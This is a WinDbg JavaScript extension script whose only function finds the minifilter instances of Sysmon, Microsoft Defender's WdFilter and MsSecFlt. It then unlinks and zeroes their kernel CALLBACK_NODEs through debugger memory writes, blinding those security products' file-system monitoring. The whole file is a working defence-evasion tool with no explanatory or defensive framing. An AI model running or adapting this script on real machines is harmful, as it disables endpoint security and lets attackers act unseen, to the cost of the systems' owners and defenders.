"use strict";

function zeroDefensiveMinifilterCallbacks() {
    const log = x => host.diagnostics.debugLog(x + "\n");
    const ctl = host.namespace.Debugger.Utility.Control;

    const targets = ["SysmonDrv", "WdFilter", "MsSecFlt"];

    log("[*] Enumerating and unlinking defensive Minifilter CALLBACK_NODEs\n");

    let filterRes = ctl.ExecuteCommand("!fltkd.filters");

    let instances = [];
    let currentFilter = "";

    for (let l of filterRes) {
        let trimmed = l.trim();

        let filterMatch = trimmed.match(/FLT_FILTER:\s+[0-9a-f`]+\s+"([^"]+)"/i);
        if (filterMatch) {
            currentFilter = filterMatch[1];
        }

        let instanceMatch = trimmed.match(/FLT_INSTANCE:\s+([0-9a-f`]+)\s+"([^"]+)"/i);
        if (instanceMatch) {
            let isTarget = false;
            for (let t of targets) {
                if (currentFilter.toLowerCase() === t.toLowerCase()) {
                    isTarget = true;
                    break;
                }
            }
            if (isTarget) {
                instances.push({
                    addr:   instanceMatch[1].replace(/`/g, ""),
                    name:   instanceMatch[2],
                    filter: currentFilter
                });
            }
        }
    }

    log("[+] Found " + instances.length + " target filter instances\n");

    for (let i = 0; i < instances.length; i++) {
        let inst = instances[i];

        log("--------------------------------------------------");
        log("[" + i + "] Filter:   " + inst.filter);
        log("[" + i + "] Instance: " + inst.name + " @ 0x" + inst.addr);

        let instRes = ctl.ExecuteCommand("!instance 0x" + inst.addr + " 4");

        let nodes = [];
        let inCallbacks = false;

        for (let l of instRes) {
            let trimmed = l.trim();

            if (trimmed.startsWith("CallbackNodes")) {
                inCallbacks = true;
                continue;
            }

            if (!inCallbacks) continue;

            let nodeMatch = trimmed.match(/CALLBACK_NODE:\s+([0-9a-f`]+)/i);
            if (nodeMatch) {
                nodes.push(nodeMatch[1].replace(/`/g, ""));
            }
        }

        log("[+] Found " + nodes.length + " CALLBACK_NODEs to unlink\n");

        for (let j = 0; j < nodes.length; j++) {
            let node = nodes[j];

            let dpsRes = ctl.ExecuteCommand("dqs 0x" + node + " L2");
            let lines = [];
            for (let l of dpsRes) {
                let trimmed = l.trim();
                if (trimmed.length > 0) lines.push(trimmed);
            }

            let flink = "";
            let blink = "";

            for (let k = 0; k < lines.length; k++) {
                let parts = lines[k].split(/\s+/);
                if (parts.length < 2) continue;
                let val = parts[1].replace(/`/g, "");
                if (k === 0) flink = val;
                if (k === 1) blink = val;
            }

            // Skip already unlinked nodes
            if (!flink || !blink ||
                flink === "0000000000000000" ||
                blink === "0000000000000000") {
                log("    [-] Skipping node 0x" + node + " - already unlinked");
                continue;
            }

            log("    [" + j + "] Unlinking CALLBACK_NODE: 0x" + node);
            log("    [" + j + "] Flink: 0x" + flink + " Blink: 0x" + blink);

            // blink->Flink = flink
            ctl.ExecuteCommand("eq 0x" + blink + " 0x" + flink);
            log("    [+] Set blink->Flink (0x" + blink + ") = 0x" + flink);

            // flink->Blink = blink
            let flinkBlinkAddrRes = ctl.ExecuteCommand("? 0x" + flink + " + 0x8");
            let flinkBlinkAddr = "";
            for (let l of flinkBlinkAddrRes) {
                let match = l.match(/=\s+([0-9a-f`]+)/i);
                if (match) {
                    flinkBlinkAddr = match[1].replace(/`/g, "");
                    break;
                }
            }

            ctl.ExecuteCommand("eq 0x" + flinkBlinkAddr + " 0x" + blink);
            log("    [+] Set flink->Blink (0x" + flinkBlinkAddr + ") = 0x" + blink);

            // Zero node Flink
            ctl.ExecuteCommand("eq 0x" + node + " 0x0");
            log("    [+] Zeroed node Flink");

            // Zero node Blink
            let nodeBlinkAddrRes = ctl.ExecuteCommand("? 0x" + node + " + 0x8");
            let nodeBlinkAddr = "";
            for (let l of nodeBlinkAddrRes) {
                let match = l.match(/=\s+([0-9a-f`]+)/i);
                if (match) {
                    nodeBlinkAddr = match[1].replace(/`/g, "");
                    break;
                }
            }

            ctl.ExecuteCommand("eq 0x" + nodeBlinkAddr + " 0x0");
            log("    [+] Zeroed node Blink");
            log("    [+] Node unlinked.\n");
        }

        log("");
    }

    log("[*] Done.");
}

function initializeScript() {
    return [
        new host.functionAlias(zeroDefensiveMinifilterCallbacks, "zeroDefensiveMinifilterCallbacks")
    ];
}
